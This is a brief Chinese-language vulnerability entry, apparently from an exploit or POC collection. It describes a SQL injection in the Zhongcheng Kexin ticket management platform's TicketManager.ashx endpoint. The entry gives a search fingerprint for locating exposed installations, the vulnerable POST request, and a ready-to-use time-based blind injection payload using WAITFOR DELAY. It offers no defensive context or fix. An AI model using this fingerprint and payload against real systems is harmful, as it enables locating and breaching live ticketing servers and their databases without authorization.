# 中成科信票务管理平台TicketManager存在SQL注入漏洞

中成科信票务管理平台 ｜ SQL注入 ｜ —
- **指纹**：`body="技术支持：北京中成科信科技发展有限公司"`
- **请求**：`POST /SystemManager/Api/TicketManager.ashx HTTP/1.1`

**Payload**
```
Method=GetReServeOrder&solutionId=1' WAITFOR DELAY '0:0:5'--
```